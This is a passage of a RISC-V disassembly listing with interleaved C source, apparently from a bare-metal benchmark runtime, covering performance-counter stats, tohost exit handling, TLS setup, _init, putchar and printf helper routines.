    800019ee:	ef8d                	bnez	a5,80001a28 <setStats+0x6e>
    800019f0:	0001a717          	auipc	a4,0x1a
    800019f4:	a9070713          	addi	a4,a4,-1392 # 8001b480 <counters>
    800019f8:	fdc42783          	lw	a5,-36(s0)
    800019fc:	078e                	slli	a5,a5,0x3
    800019fe:	97ba                	add	a5,a5,a4
    80001a00:	639c                	ld	a5,0(a5)
    80001a02:	fe843703          	ld	a4,-24(s0)
    80001a06:	40f707b3          	sub	a5,a4,a5
    80001a0a:	fef43423          	sd	a5,-24(s0)
    80001a0e:	0001a717          	auipc	a4,0x1a
    80001a12:	a8270713          	addi	a4,a4,-1406 # 8001b490 <counter_names>
    80001a16:	fdc42783          	lw	a5,-36(s0)
    80001a1a:	078e                	slli	a5,a5,0x3
    80001a1c:	97ba                	add	a5,a5,a4
    80001a1e:	00001717          	auipc	a4,0x1
    80001a22:	f7270713          	addi	a4,a4,-142 # 80002990 <atol+0x240>
    80001a26:	e398                	sd	a4,0(a5)
    80001a28:	fdc42783          	lw	a5,-36(s0)
    80001a2c:	0017871b          	addiw	a4,a5,1
    80001a30:	fce42e23          	sw	a4,-36(s0)
    80001a34:	0001a717          	auipc	a4,0x1a
    80001a38:	a4c70713          	addi	a4,a4,-1460 # 8001b480 <counters>
    80001a3c:	078e                	slli	a5,a5,0x3
    80001a3e:	97ba                	add	a5,a5,a4
    80001a40:	fe843703          	ld	a4,-24(s0)
    80001a44:	e398                	sd	a4,0(a5)
  READ_CTR(minstret);
    80001a46:	fdc42783          	lw	a5,-36(s0)
    80001a4a:	0007871b          	sext.w	a4,a5
    80001a4e:	4785                	li	a5,1
    80001a50:	fee7cbe3          	blt	a5,a4,80001a46 <setStats+0x8c>
    80001a54:	b02027f3          	csrr	a5,minstret
    80001a58:	fcf43423          	sd	a5,-56(s0)
    80001a5c:	fc843783          	ld	a5,-56(s0)
    80001a60:	fef43023          	sd	a5,-32(s0)
    80001a64:	fbc42783          	lw	a5,-68(s0)
    80001a68:	2781                	sext.w	a5,a5
    80001a6a:	ef8d                	bnez	a5,80001aa4 <setStats+0xea>
    80001a6c:	0001a717          	auipc	a4,0x1a
    80001a70:	a1470713          	addi	a4,a4,-1516 # 8001b480 <counters>
    80001a74:	fdc42783          	lw	a5,-36(s0)
    80001a78:	078e                	slli	a5,a5,0x3
    80001a7a:	97ba                	add	a5,a5,a4
    80001a7c:	639c                	ld	a5,0(a5)
    80001a7e:	fe043703          	ld	a4,-32(s0)
    80001a82:	40f707b3          	sub	a5,a4,a5
    80001a86:	fef43023          	sd	a5,-32(s0)
    80001a8a:	0001a717          	auipc	a4,0x1a
    80001a8e:	a0670713          	addi	a4,a4,-1530 # 8001b490 <counter_names>
    80001a92:	fdc42783          	lw	a5,-36(s0)
    80001a96:	078e                	slli	a5,a5,0x3
    80001a98:	97ba                	add	a5,a5,a4
    80001a9a:	00001717          	auipc	a4,0x1
    80001a9e:	efe70713          	addi	a4,a4,-258 # 80002998 <atol+0x248>
    80001aa2:	e398                	sd	a4,0(a5)
    80001aa4:	fdc42783          	lw	a5,-36(s0)
    80001aa8:	0017871b          	addiw	a4,a5,1
    80001aac:	fce42e23          	sw	a4,-36(s0)
    80001ab0:	0001a717          	auipc	a4,0x1a
    80001ab4:	9d070713          	addi	a4,a4,-1584 # 8001b480 <counters>
    80001ab8:	078e                	slli	a5,a5,0x3
    80001aba:	97ba                	add	a5,a5,a4
    80001abc:	fe043703          	ld	a4,-32(s0)
    80001ac0:	e398                	sd	a4,0(a5)

#undef READ_CTR
}
    80001ac2:	0001                	nop
    80001ac4:	6426                	ld	s0,72(sp)
    80001ac6:	6161                	addi	sp,sp,80
    80001ac8:	8082                	ret

0000000080001aca <tohost_exit>:

void __attribute__((noreturn)) tohost_exit(uintptr_t code)
{
    80001aca:	1101                	addi	sp,sp,-32
    80001acc:	ec22                	sd	s0,24(sp)
    80001ace:	1000                	addi	s0,sp,32
    80001ad0:	fea43423          	sd	a0,-24(s0)
  tohost = (code << 1) | 1;
    80001ad4:	fe843783          	ld	a5,-24(s0)
    80001ad8:	0786                	slli	a5,a5,0x1
    80001ada:	0017e713          	ori	a4,a5,1
    80001ade:	fffff797          	auipc	a5,0xfffff
    80001ae2:	52278793          	addi	a5,a5,1314 # 80001000 <tohost>
    80001ae6:	e398                	sd	a4,0(a5)
  while (1);
    80001ae8:	a001                	j	80001ae8 <tohost_exit+0x1e>

0000000080001aea <handle_trap>:
}

uintptr_t __attribute__((weak)) handle_trap(uintptr_t cause, uintptr_t epc, uintptr_t regs[32])
{
    80001aea:	7179                	addi	sp,sp,-48
    80001aec:	f406                	sd	ra,40(sp)
    80001aee:	f022                	sd	s0,32(sp)
    80001af0:	1800                	addi	s0,sp,48
    80001af2:	fea43423          	sd	a0,-24(s0)
    80001af6:	feb43023          	sd	a1,-32(s0)
    80001afa:	fcc43c23          	sd	a2,-40(s0)
  tohost_exit(1337);
    80001afe:	53900513          	li	a0,1337
    80001b02:	fc9ff0ef          	jal	ra,80001aca <tohost_exit>

0000000080001b06 <exit>:
}

void exit(int code)
{
    80001b06:	1101                	addi	sp,sp,-32
    80001b08:	ec06                	sd	ra,24(sp)
    80001b0a:	e822                	sd	s0,16(sp)
    80001b0c:	1000                	addi	s0,sp,32
    80001b0e:	87aa                	mv	a5,a0
    80001b10:	fef42623          	sw	a5,-20(s0)
  tohost_exit(code);
    80001b14:	fec42783          	lw	a5,-20(s0)
    80001b18:	853e                	mv	a0,a5
    80001b1a:	fb1ff0ef          	jal	ra,80001aca <tohost_exit>

0000000080001b1e <abort>:
}

void abort()
{
    80001b1e:	1141                	addi	sp,sp,-16
    80001b20:	e406                	sd	ra,8(sp)
    80001b22:	e022                	sd	s0,0(sp)
    80001b24:	0800                	addi	s0,sp,16
  exit(128 + SIGABRT);
    80001b26:	08600513          	li	a0,134
    80001b2a:	fddff0ef          	jal	ra,80001b06 <exit>

0000000080001b2e <printstr>:
}

void printstr(const char* s)
{
    80001b2e:	7179                	addi	sp,sp,-48
    80001b30:	f406                	sd	ra,40(sp)
    80001b32:	f022                	sd	s0,32(sp)
    80001b34:	ec26                	sd	s1,24(sp)
    80001b36:	1800                	addi	s0,sp,48
    80001b38:	fca43c23          	sd	a0,-40(s0)
  syscall(SYS_write, 1, (uintptr_t)s, strlen(s));
    80001b3c:	fd843483          	ld	s1,-40(s0)
    80001b40:	fd843503          	ld	a0,-40(s0)
    80001b44:	2c9000ef          	jal	ra,8000260c <strlen>
    80001b48:	87aa                	mv	a5,a0
    80001b4a:	86be                	mv	a3,a5
    80001b4c:	8626                	mv	a2,s1
    80001b4e:	4585                	li	a1,1
    80001b50:	04000513          	li	a0,64
    80001b54:	de9ff0ef          	jal	ra,8000193c <syscall>
}
    80001b58:	0001                	nop
    80001b5a:	70a2                	ld	ra,40(sp)
    80001b5c:	7402                	ld	s0,32(sp)
    80001b5e:	64e2                	ld	s1,24(sp)
    80001b60:	6145                	addi	sp,sp,48
    80001b62:	8082                	ret

0000000080001b64 <thread_entry>:

void __attribute__((weak)) thread_entry(int cid, int nc)
{
    80001b64:	1101                	addi	sp,sp,-32
    80001b66:	ec22                	sd	s0,24(sp)
    80001b68:	1000                	addi	s0,sp,32
    80001b6a:	87aa                	mv	a5,a0
    80001b6c:	872e                	mv	a4,a1
    80001b6e:	fef42623          	sw	a5,-20(s0)
    80001b72:	87ba                	mv	a5,a4
    80001b74:	fef42423          	sw	a5,-24(s0)
  // multi-threaded programs override this function.
  // for the case of single-threaded programs, only let core 0 proceed.
  while (cid != 0);
    80001b78:	fec42783          	lw	a5,-20(s0)
    80001b7c:	2781                	sext.w	a5,a5
    80001b7e:	ffed                	bnez	a5,80001b78 <thread_entry+0x14>
}
    80001b80:	0001                	nop
    80001b82:	0001                	nop
    80001b84:	6462                	ld	s0,24(sp)
    80001b86:	6105                	addi	sp,sp,32
    80001b88:	8082                	ret

int __attribute__((weak)) main(int argc, char** argv)
{
    80001b8a:	1101                	addi	sp,sp,-32
    80001b8c:	ec06                	sd	ra,24(sp)
    80001b8e:	e822                	sd	s0,16(sp)
    80001b90:	1000                	addi	s0,sp,32
    80001b92:	87aa                	mv	a5,a0
    80001b94:	feb43023          	sd	a1,-32(s0)
    80001b98:	fef42623          	sw	a5,-20(s0)
  // single-threaded programs override this function.
  printstr("Implement main(), foo!\n");
    80001b9c:	00001517          	auipc	a0,0x1
    80001ba0:	e0c50513          	addi	a0,a0,-500 # 800029a8 <atol+0x258>
    80001ba4:	f8bff0ef          	jal	ra,80001b2e <printstr>
  return -1;
    80001ba8:	57fd                	li	a5,-1
}
    80001baa:	853e                	mv	a0,a5
    80001bac:	60e2                	ld	ra,24(sp)
    80001bae:	6442                	ld	s0,16(sp)
    80001bb0:	6105                	addi	sp,sp,32
    80001bb2:	8082                	ret

0000000080001bb4 <init_tls>:

static void init_tls()
{
    80001bb4:	1101                	addi	sp,sp,-32
    80001bb6:	ec06                	sd	ra,24(sp)
    80001bb8:	e822                	sd	s0,16(sp)
    80001bba:	1000                	addi	s0,sp,32
  register void* thread_pointer asm("tp");
  extern char _tls_data;
  extern __thread char _tdata_begin, _tdata_end, _tbss_end;
  size_t tdata_size = &_tdata_end - &_tdata_begin;
    80001bbc:	00020713          	mv	a4,tp
    80001bc0:	00020793          	mv	a5,tp
    80001bc4:	40f707b3          	sub	a5,a4,a5
    80001bc8:	fef43423          	sd	a5,-24(s0)
  memcpy(thread_pointer, &_tls_data, tdata_size);
    80001bcc:	8792                	mv	a5,tp
    80001bce:	fe843603          	ld	a2,-24(s0)
    80001bd2:	0001a597          	auipc	a1,0x1a
    80001bd6:	8ee58593          	addi	a1,a1,-1810 # 8001b4c0 <_end>
    80001bda:	853e                	mv	a0,a5
    80001bdc:	0ab000ef          	jal	ra,80002486 <memcpy>
  size_t tbss_size = &_tbss_end - &_tdata_end;
    80001be0:	08420713          	addi	a4,tp,132 # 84 <_tbss_end>
    80001be4:	00020793          	mv	a5,tp
    80001be8:	40f707b3          	sub	a5,a4,a5
    80001bec:	fef43023          	sd	a5,-32(s0)
  memset(thread_pointer + tdata_size, 0, tbss_size);
    80001bf0:	8712                	mv	a4,tp
    80001bf2:	fe843783          	ld	a5,-24(s0)
    80001bf6:	97ba                	add	a5,a5,a4
    80001bf8:	fe043603          	ld	a2,-32(s0)
    80001bfc:	4581                	li	a1,0
    80001bfe:	853e                	mv	a0,a5
    80001c00:	13f000ef          	jal	ra,8000253e <memset>
}
    80001c04:	0001                	nop
    80001c06:	60e2                	ld	ra,24(sp)
    80001c08:	6442                	ld	s0,16(sp)
    80001c0a:	6105                	addi	sp,sp,32
    80001c0c:	8082                	ret

0000000080001c0e <_init>:

void _init(int cid, int nc)
{
    80001c0e:	7171                	addi	sp,sp,-176
    80001c10:	f506                	sd	ra,168(sp)
    80001c12:	f122                	sd	s0,160(sp)
    80001c14:	ed26                	sd	s1,152(sp)
    80001c16:	1900                	addi	s0,sp,176
    80001c18:	87aa                	mv	a5,a0
    80001c1a:	872e                	mv	a4,a1
    80001c1c:	f4f42e23          	sw	a5,-164(s0)
    80001c20:	87ba                	mv	a5,a4
    80001c22:	f4f42c23          	sw	a5,-168(s0)
    80001c26:	fe040793          	addi	a5,s0,-32
    80001c2a:	f4f43823          	sd	a5,-176(s0)
    80001c2e:	f5043783          	ld	a5,-176(s0)
    80001c32:	f8078793          	addi	a5,a5,-128
    80001c36:	03f78793          	addi	a5,a5,63
    80001c3a:	8399                	srli	a5,a5,0x6
    80001c3c:	00679493          	slli	s1,a5,0x6
  init_tls();
    80001c40:	f75ff0ef          	jal	ra,80001bb4 <init_tls>
  thread_entry(cid, nc);
    80001c44:	f5842703          	lw	a4,-168(s0)
    80001c48:	f5c42783          	lw	a5,-164(s0)
    80001c4c:	85ba                	mv	a1,a4
    80001c4e:	853e                	mv	a0,a5
    80001c50:	f15ff0ef          	jal	ra,80001b64 <thread_entry>

  // only single-threaded programs should ever get here.
  int ret = main(0, 0);
    80001c54:	4581                	li	a1,0
    80001c56:	4501                	li	a0,0
    80001c58:	df8ff0ef          	jal	ra,80001250 <main>
    80001c5c:	87aa                	mv	a5,a0
    80001c5e:	fcf42823          	sw	a5,-48(s0)

  char buf[NUM_COUNTERS * 32] __attribute__((aligned(64)));
  char* pbuf = buf;
    80001c62:	fc943c23          	sd	s1,-40(s0)
  for (int i = 0; i < NUM_COUNTERS; i++)
    80001c66:	fc042a23          	sw	zero,-44(s0)
    80001c6a:	a095                	j	80001cce <_init+0xc0>
    if (counters[i])
    80001c6c:	0001a717          	auipc	a4,0x1a
    80001c70:	81470713          	addi	a4,a4,-2028 # 8001b480 <counters>
    80001c74:	fd442783          	lw	a5,-44(s0)
    80001c78:	078e                	slli	a5,a5,0x3
    80001c7a:	97ba                	add	a5,a5,a4
    80001c7c:	639c                	ld	a5,0(a5)
    80001c7e:	c3b9                	beqz	a5,80001cc4 <_init+0xb6>
      pbuf += sprintf(pbuf, "%s = %ld\n", counter_names[i], counters[i]);
    80001c80:	0001a717          	auipc	a4,0x1a
    80001c84:	81070713          	addi	a4,a4,-2032 # 8001b490 <counter_names>
    80001c88:	fd442783          	lw	a5,-44(s0)
    80001c8c:	078e                	slli	a5,a5,0x3
    80001c8e:	97ba                	add	a5,a5,a4
    80001c90:	6390                	ld	a2,0(a5)
    80001c92:	00019717          	auipc	a4,0x19
    80001c96:	7ee70713          	addi	a4,a4,2030 # 8001b480 <counters>
    80001c9a:	fd442783          	lw	a5,-44(s0)
    80001c9e:	078e                	slli	a5,a5,0x3
    80001ca0:	97ba                	add	a5,a5,a4
    80001ca2:	639c                	ld	a5,0(a5)
    80001ca4:	86be                	mv	a3,a5
    80001ca6:	00001597          	auipc	a1,0x1
    80001caa:	d1a58593          	addi	a1,a1,-742 # 800029c0 <atol+0x270>
    80001cae:	fd843503          	ld	a0,-40(s0)
    80001cb2:	712000ef          	jal	ra,800023c4 <sprintf>
    80001cb6:	87aa                	mv	a5,a0
    80001cb8:	873e                	mv	a4,a5
    80001cba:	fd843783          	ld	a5,-40(s0)
    80001cbe:	97ba                	add	a5,a5,a4
    80001cc0:	fcf43c23          	sd	a5,-40(s0)
  for (int i = 0; i < NUM_COUNTERS; i++)
    80001cc4:	fd442783          	lw	a5,-44(s0)
    80001cc8:	2785                	addiw	a5,a5,1
    80001cca:	fcf42a23          	sw	a5,-44(s0)
    80001cce:	fd442783          	lw	a5,-44(s0)
    80001cd2:	0007871b          	sext.w	a4,a5
    80001cd6:	4785                	li	a5,1
    80001cd8:	f8e7dae3          	ble	a4,a5,80001c6c <_init+0x5e>
  if (pbuf != buf)
    80001cdc:	fd843783          	ld	a5,-40(s0)
    80001ce0:	00f48563          	beq	s1,a5,80001cea <_init+0xdc>
    printstr(buf);
    80001ce4:	8526                	mv	a0,s1
    80001ce6:	e49ff0ef          	jal	ra,80001b2e <printstr>

  exit(ret);
    80001cea:	fd042783          	lw	a5,-48(s0)
    80001cee:	853e                	mv	a0,a5
    80001cf0:	e17ff0ef          	jal	ra,80001b06 <exit>

0000000080001cf4 <putchar>:
}

#undef putchar
int putchar(int ch)
{
    80001cf4:	1101                	addi	sp,sp,-32
    80001cf6:	ec06                	sd	ra,24(sp)
    80001cf8:	e822                	sd	s0,16(sp)
    80001cfa:	1000                	addi	s0,sp,32
    80001cfc:	87aa                	mv	a5,a0
    80001cfe:	fef42623          	sw	a5,-20(s0)
  static __thread char buf[64] __attribute__((aligned(64)));
  static __thread int buflen = 0;

  buf[buflen++] = ch;
    80001d02:	08022783          	lw	a5,128(tp) # 80 <buflen.2991>
    80001d06:	0017871b          	addiw	a4,a5,1
    80001d0a:	0007069b          	sext.w	a3,a4
    80001d0e:	08d22023          	sw	a3,128(tp) # 80 <buflen.2991>
    80001d12:	fec42703          	lw	a4,-20(s0)
    80001d16:	0ff77713          	andi	a4,a4,255
    80001d1a:	04020693          	addi	a3,tp,64 # 40 <buf.2990>
    80001d1e:	97b6                	add	a5,a5,a3
    80001d20:	00e78023          	sb	a4,0(a5)

  if (ch == '\n' || buflen == sizeof(buf))
    80001d24:	fec42783          	lw	a5,-20(s0)
    80001d28:	0007871b          	sext.w	a4,a5
    80001d2c:	47a9                	li	a5,10
    80001d2e:	00f70963          	beq	a4,a5,80001d40 <putchar+0x4c>
    80001d32:	08022783          	lw	a5,128(tp) # 80 <buflen.2991>
    80001d36:	873e                	mv	a4,a5
    80001d38:	04000793          	li	a5,64
    80001d3c:	00f71f63          	bne	a4,a5,80001d5a <putchar+0x66>
  {
    syscall(SYS_write, 1, (uintptr_t)buf, buflen);
    80001d40:	04020713          	addi	a4,tp,64 # 40 <buf.2990>
    80001d44:	08022783          	lw	a5,128(tp) # 80 <buflen.2991>
    80001d48:	86be                	mv	a3,a5
    80001d4a:	863a                	mv	a2,a4
    80001d4c:	4585                	li	a1,1
    80001d4e:	04000513          	li	a0,64
    80001d52:	bebff0ef          	jal	ra,8000193c <syscall>
    buflen = 0;
    80001d56:	08022023          	sw	zero,128(tp) # 80 <buflen.2991>
  }

  return 0;
    80001d5a:	4781                	li	a5,0
}
    80001d5c:	853e                	mv	a0,a5
    80001d5e:	60e2                	ld	ra,24(sp)
    80001d60:	6442                	ld	s0,16(sp)
    80001d62:	6105                	addi	sp,sp,32
    80001d64:	8082                	ret

0000000080001d66 <printhex>:

void printhex(uint64_t x)
{
    80001d66:	7139                	addi	sp,sp,-64
    80001d68:	fc06                	sd	ra,56(sp)
    80001d6a:	f822                	sd	s0,48(sp)
    80001d6c:	0080                	addi	s0,sp,64
    80001d6e:	fca43423          	sd	a0,-56(s0)
  char str[17];
  int i;
  for (i = 0; i < 16; i++)
    80001d72:	fe042623          	sw	zero,-20(s0)
    80001d76:	a8a1                	j	80001dce <printhex+0x68>
  {
    str[15-i] = (x & 0xF) + ((x & 0xF) < 10 ? '0' : 'a'-10);
    80001d78:	fc843783          	ld	a5,-56(s0)
    80001d7c:	0ff7f793          	andi	a5,a5,255
    80001d80:	8bbd                	andi	a5,a5,15
    80001d82:	0ff7f713          	andi	a4,a5,255
    80001d86:	fc843783          	ld	a5,-56(s0)
    80001d8a:	00f7f693          	andi	a3,a5,15
    80001d8e:	47a5                	li	a5,9
    80001d90:	00d7e563          	bltu	a5,a3,80001d9a <printhex+0x34>
    80001d94:	03000793          	li	a5,48
    80001d98:	a019                	j	80001d9e <printhex+0x38>
    80001d9a:	05700793          	li	a5,87
    80001d9e:	463d                	li	a2,15
    80001da0:	fec42683          	lw	a3,-20(s0)
    80001da4:	40d606bb          	subw	a3,a2,a3
    80001da8:	2681                	sext.w	a3,a3
    80001daa:	9fb9                	addw	a5,a5,a4
    80001dac:	0ff7f713          	andi	a4,a5,255
    80001db0:	ff040793          	addi	a5,s0,-16
    80001db4:	97b6                	add	a5,a5,a3
    80001db6:	fee78423          	sb	a4,-24(a5)
    x >>= 4;
    80001dba:	fc843783          	ld	a5,-56(s0)
    80001dbe:	8391                	srli	a5,a5,0x4
    80001dc0:	fcf43423          	sd	a5,-56(s0)
  for (i = 0; i < 16; i++)
    80001dc4:	fec42783          	lw	a5,-20(s0)
    80001dc8:	2785                	addiw	a5,a5,1
    80001dca:	fef42623          	sw	a5,-20(s0)
    80001dce:	fec42783          	lw	a5,-20(s0)
    80001dd2:	0007871b          	sext.w	a4,a5
    80001dd6:	47bd                	li	a5,15
    80001dd8:	fae7d0e3          	ble	a4,a5,80001d78 <printhex+0x12>
  }
  str[16] = 0;
    80001ddc:	fe040423          	sb	zero,-24(s0)

  printstr(str);
    80001de0:	fd840793          	addi	a5,s0,-40
    80001de4:	853e                	mv	a0,a5
    80001de6:	d49ff0ef          	jal	ra,80001b2e <printstr>
}
    80001dea:	0001                	nop
    80001dec:	70e2                	ld	ra,56(sp)
    80001dee:	7442                	ld	s0,48(sp)
    80001df0:	6121                	addi	sp,sp,64
    80001df2:	8082                	ret

0000000080001df4 <printnum>:

static inline void printnum(void (*putch)(int, void**), void **putdat,
                    unsigned long long num, unsigned base, int width, int padc)
{
    80001df4:	714d                	addi	sp,sp,-336
    80001df6:	e686                	sd	ra,328(sp)
    80001df8:	e2a2                	sd	s0,320(sp)
    80001dfa:	0a80                	addi	s0,sp,336
    80001dfc:	eca43c23          	sd	a0,-296(s0)
    80001e00:	ecb43823          	sd	a1,-304(s0)
    80001e04:	ecc43423          	sd	a2,-312(s0)
    80001e08:	8636                	mv	a2,a3
    80001e0a:	86ba                	mv	a3,a4
    80001e0c:	873e                	mv	a4,a5
    80001e0e:	87b2                	mv	a5,a2
    80001e10:	ecf42223          	sw	a5,-316(s0)
    80001e14:	87b6                	mv	a5,a3
    80001e16:	ecf42023          	sw	a5,-320(s0)
    80001e1a:	87ba                	mv	a5,a4
    80001e1c:	eaf42e23          	sw	a5,-324(s0)
  unsigned digs[sizeof(num)*CHAR_BIT];
  int pos = 0;
    80001e20:	fe042623          	sw	zero,-20(s0)

  while (1)
  {
    digs[pos++] = num % base;
    80001e24:	ec446783          	lwu	a5,-316(s0)
    80001e28:	ec843703          	ld	a4,-312(s0)
    80001e2c:	02f776b3          	remu	a3,a4,a5
    80001e30:	fec42783          	lw	a5,-20(s0)
    80001e34:	0017871b          	addiw	a4,a5,1
    80001e38:	fee42623          	sw	a4,-20(s0)
    80001e3c:	0006871b          	sext.w	a4,a3
    80001e40:	078a                	slli	a5,a5,0x2
    80001e42:	ff040693          	addi	a3,s0,-16
    80001e46:	97b6                	add	a5,a5,a3
    80001e48:	eee7ac23          	sw	a4,-264(a5)
    if (num < base)
    80001e4c:	ec446783          	lwu	a5,-316(s0)
    80001e50:	ec843703          	ld	a4,-312(s0)
    80001e54:	00f76b63          	bltu	a4,a5,80001e6a <printnum+0x76>
      break;
    num /= base;
    80001e58:	ec446783          	lwu	a5,-316(s0)
    80001e5c:	ec843703          	ld	a4,-312(s0)
    80001e60:	02f757b3          	divu	a5,a4,a5
    80001e64:	ecf43423          	sd	a5,-312(s0)
    digs[pos++] = num % base;
    80001e68:	bf75                	j	80001e24 <printnum+0x30>
      break;
    80001e6a:	0001                	nop
  }

  while (width-- > pos)
    80001e6c:	a809                	j	80001e7e <printnum+0x8a>
    putch(padc, putdat);
    80001e6e:	ebc42783          	lw	a5,-324(s0)
    80001e72:	ed843703          	ld	a4,-296(s0)
    80001e76:	ed043583          	ld	a1,-304(s0)
    80001e7a:	853e                	mv	a0,a5
    80001e7c:	9702                	jalr	a4
  while (width-- > pos)
    80001e7e:	ec042783          	lw	a5,-320(s0)
    80001e82:	fff7871b          	addiw	a4,a5,-1
    80001e86:	ece42023          	sw	a4,-320(s0)
    80001e8a:	fec42703          	lw	a4,-20(s0)
    80001e8e:	2701                	sext.w	a4,a4
    80001e90:	fcf74fe3          	blt	a4,a5,80001e6e <printnum+0x7a>

  while (pos-- > 0)
    80001e94:	a099                	j	80001eda <printnum+0xe6>
    putch(digs[pos] + (digs[pos] >= 10 ? 'a' - 10 : '0'), putdat);
    80001e96:	fec42783          	lw	a5,-20(s0)
    80001e9a:	078a                	slli	a5,a5,0x2
    80001e9c:	ff040713          	addi	a4,s0,-16
    80001ea0:	97ba                	add	a5,a5,a4
    80001ea2:	ef87a703          	lw	a4,-264(a5)
    80001ea6:	fec42783          	lw	a5,-20(s0)
    80001eaa:	078a                	slli	a5,a5,0x2
    80001eac:	ff040693          	addi	a3,s0,-16
    80001eb0:	97b6                	add	a5,a5,a3
    80001eb2:	ef87a783          	lw	a5,-264(a5)
    80001eb6:	86be                	mv	a3,a5
    80001eb8:	47a5                	li	a5,9
    80001eba:	00d7f563          	bleu	a3,a5,80001ec4 <printnum+0xd0>
    80001ebe:	05700793          	li	a5,87
    80001ec2:	a019                	j	80001ec8 <printnum+0xd4>
    80001ec4:	03000793          	li	a5,48
    80001ec8:	9fb9                	addw	a5,a5,a4
    80001eca:	2781                	sext.w	a5,a5
    80001ecc:	2781                	sext.w	a5,a5
    80001ece:	ed843703          	ld	a4,-296(s0)
    80001ed2:	ed043583          	ld	a1,-304(s0)
    80001ed6:	853e                	mv	a0,a5
    80001ed8:	9702                	jalr	a4
  while (pos-- > 0)
    80001eda:	fec42783          	lw	a5,-20(s0)
    80001ede:	fff7871b          	addiw	a4,a5,-1
    80001ee2:	fee42623          	sw	a4,-20(s0)
    80001ee6:	faf048e3          	bgtz	a5,80001e96 <printnum+0xa2>
}
    80001eea:	0001                	nop
    80001eec:	0001                	nop
    80001eee:	60b6                	ld	ra,328(sp)
    80001ef0:	6416                	ld	s0,320(sp)
    80001ef2:	6171                	addi	sp,sp,336
    80001ef4:	8082                	ret

0000000080001ef6 <getuint>:

static unsigned long long getuint(va_list *ap, int lflag)
{
    80001ef6:	1101                	addi	sp,sp,-32
    80001ef8:	ec22                	sd	s0,24(sp)
    80001efa:	1000                	addi	s0,sp,32
    80001efc:	fea43423          	sd	a0,-24(s0)
    80001f00:	87ae                	mv	a5,a1
    80001f02:	fef42223          	sw	a5,-28(s0)
  if (lflag >= 2)
    80001f06:	fe442783          	lw	a5,-28(s0)
    80001f0a:	0007871b          	sext.w	a4,a5
    80001f0e:	4785                	li	a5,1
    80001f10:	00e7dc63          	ble	a4,a5,80001f28 <getuint+0x32>
    return va_arg(*ap, unsigned long long);
    80001f14:	fe843783          	ld	a5,-24(s0)
    80001f18:	639c                	ld	a5,0(a5)
    80001f1a:	00878693          	addi	a3,a5,8
    80001f1e:	fe843703          	ld	a4,-24(s0)
    80001f22:	e314                	sd	a3,0(a4)
    80001f24:	639c                	ld	a5,0(a5)
    80001f26:	a815                	j	80001f5a <getuint+0x64>
  else if (lflag)
    80001f28:	fe442783          	lw	a5,-28(s0)
    80001f2c:	2781                	sext.w	a5,a5
    80001f2e:	cb99                	beqz	a5,80001f44 <getuint+0x4e>
    return va_arg(*ap, unsigned long);
    80001f30:	fe843783          	ld	a5,-24(s0)
    80001f34:	639c                	ld	a5,0(a5)
    80001f36:	00878693          	addi	a3,a5,8
    80001f3a:	fe843703          	ld	a4,-24(s0)
    80001f3e:	e314                	sd	a3,0(a4)
    80001f40:	639c                	ld	a5,0(a5)
    80001f42:	a821                	j	80001f5a <getuint+0x64>
  else
    return va_arg(*ap, unsigned int);
    80001f44:	fe843783          	ld	a5,-24(s0)
    80001f48:	639c                	ld	a5,0(a5)
    80001f4a:	00878693          	addi	a3,a5,8
    80001f4e:	fe843703          	ld	a4,-24(s0)
    80001f52:	e314                	sd	a3,0(a4)
    80001f54:	439c                	lw	a5,0(a5)
    80001f56:	1782                	slli	a5,a5,0x20
    80001f58:	9381                	srli	a5,a5,0x20
}
    80001f5a:	853e                	mv	a0,a5
    80001f5c:	6462                	ld	s0,24(sp)
    80001f5e:	6105                	addi	sp,sp,32
    80001f60:	8082                	ret

0000000080001f62 <getint>:

static long long getint(va_list *ap, int lflag)
{
    80001f62:	1101                	addi	sp,sp,-32
    80001f64:	ec22                	sd	s0,24(sp)
    80001f66:	1000                	addi	s0,sp,32
    80001f68:	fea43423          	sd	a0,-24(s0)
    80001f6c:	87ae                	mv	a5,a1
    80001f6e:	fef42223          	sw	a5,-28(s0)
  if (lflag >= 2)
    80001f72:	fe442783          	lw	a5,-28(s0)
    80001f76:	0007871b          	sext.w	a4,a5
    80001f7a:	4785                	li	a5,1
    80001f7c:	00e7dc63          	ble	a4,a5,80001f94 <getint+0x32>
    return va_arg(*ap, long long);
    80001f80:	fe843783          	ld	a5,-24(s0)
    80001f84:	639c                	ld	a5,0(a5)
    80001f86:	00878693          	addi	a3,a5,8
    80001f8a:	fe843703          	ld	a4,-24(s0)
    80001f8e:	e314                	sd	a3,0(a4)
    80001f90:	639c                	ld	a5,0(a5)
    80001f92:	a805                	j	80001fc2 <getint+0x60>
  else if (lflag)
    80001f94:	fe442783          	lw	a5,-28(s0)
    80001f98:	2781                	sext.w	a5,a5
    80001f9a:	cb99                	beqz	a5,80001fb0 <getint+0x4e>
    return va_arg(*ap, long);
    80001f9c:	fe843783          	ld	a5,-24(s0)
    80001fa0:	639c                	ld	a5,0(a5)
    80001fa2:	00878693          	addi	a3,a5,8
    80001fa6:	fe843703          	ld	a4,-24(s0)
    80001faa:	e314                	sd	a3,0(a4)
    80001fac:	639c                	ld	a5,0(a5)
    80001fae:	a811                	j	80001fc2 <getint+0x60>
  else
    return va_arg(*ap, int);
    80001fb0:	fe843783          	ld	a5,-24(s0)
    80001fb4:	639c                	ld	a5,0(a5)
    80001fb6:	00878693          	addi	a3,a5,8
    80001fba:	fe843703          	ld	a4,-24(s0)
    80001fbe:	e314                	sd	a3,0(a4)
    80001fc0:	439c                	lw	a5,0(a5)
}
    80001fc2:	853e                	mv	a0,a5
    80001fc4:	6462                	ld	s0,24(sp)
    80001fc6:	6105                	addi	sp,sp,32
    80001fc8:	8082                	ret

0000000080001fca <vprintfmt>:

static void vprintfmt(void (*putch)(int, void**), void **putdat, const char *fmt, va_list ap)
{
    80001fca:	7159                	addi	sp,sp,-112
    80001fcc:	f486                	sd	ra,104(sp)
    80001fce:	f0a2                	sd	s0,96(sp)
    80001fd0:	eca6                	sd	s1,88(sp)
    80001fd2:	e8ca                	sd	s2,80(sp)
    80001fd4:	1880                	addi	s0,sp,112
    80001fd6:	faa43423          	sd	a0,-88(s0)
    80001fda:	fab43023          	sd	a1,-96(s0)
    80001fde:	f8c43c23          	sd	a2,-104(s0)
    80001fe2:	f8d43823          	sd	a3,-112(s0)
  unsigned long long num;
  int base, lflag, width, precision, altflag;
  char padc;

  while (1) {
    while ((ch = *(unsigned char *) fmt) != '%') {
    80001fe6:	a831                	j	80002002 <vprintfmt+0x38>
      if (ch == '\0')
    80001fe8:	32048963          	beqz	s1,8000231a <vprintfmt+0x350>
        return;
      fmt++;
    80001fec:	f9843783          	ld	a5,-104(s0)
